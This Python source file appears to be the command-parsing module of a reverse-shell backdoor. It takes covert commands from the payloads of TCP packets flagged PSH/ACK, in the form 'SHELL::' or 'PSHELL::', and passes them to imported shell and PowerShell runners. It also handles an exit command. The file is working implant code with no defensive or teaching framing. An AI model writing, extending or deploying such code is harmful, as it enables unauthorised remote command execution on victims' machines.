from rsShell import *
from rsPowerShell import *

class ModuleParsing:
	validModules = ["SHELL", "PSHELL"]

	def __init__(self, packet):
		self.packet = packet
		self.rawPktPayload = packet.tcp.payload

		self.moduleHandler()

	def moduleHandler(self):
		if ("::" in self.rawPktPayload):
			if (len(self.rawPktPayload.split("::")) >= 2):
				self.module = self.rawPktPayload.split("::")[0]
				self.isValidModule()
				self.isValidPacket()

				if self.isValidModule and self.isValidPacket:
					self.modulePayload = self.rawPktPayload.split("::")[1]
					self.executeModule()

				else:
					self.modulePayload = self.rawPktPayload.split("::")[1]
					self.response = "[!] Invalid module!"

			else:
				self.response = "[!] Invalid request!"
				self.module = "N/A"
				self.modulePayload = "N/A"
		elif self.rawPktPayload == "exit":
			self.response = "xxxEXITxxx"
			self.module = "N/A"
			self.modulePayload = "N/A"
		else:
			self.response = "[!] Invalid request!"
			self.module = "N/A"
			self.modulePayload = "N/A" 

	# Verify the module call is a valid and existing module
	def isValidModule(self):
		if self.module in self.validModules:
			self.isValidModule = True
		else:
			self.isValidModule = False

	# Verify the module call packet is a valid PSH|ACK packet
	def isValidPacket(self):
		self.getFlags()

		if ((self.flags[1]==1) and (self.flags[2]==1)) and ((self.flags[0]+self.flags[3]+self.flags[4])==0):
			self.isValidPacket = True

		else:
			self.isValidPacket = False

	# Determine the called module and execute it
	def executeModule(self):
		self.response = self.module + " --> " + self.modulePayload
		if self.module == "SHELL":
			self.response = rsShell(self.modulePayload).response

		elif self.module == "PSHELL":
			self.response = rsPowerShell(self.modulePayload).response

	def getFlags(self):
		self.flags = [0, 0, 0, 0, 0]

		if self.packet.tcp.syn == True:
			self.flags[0] = 1

		if self.packet.tcp.ack == True:
			self.flags[1] = 1

		if self.packet.tcp.psh == True:
			self.flags[2] = 1

		if self.packet.tcp.fin == True:
			self.flags[3] = 1

		if self.packet.tcp.rst == True:
			self.flags[4] = 1
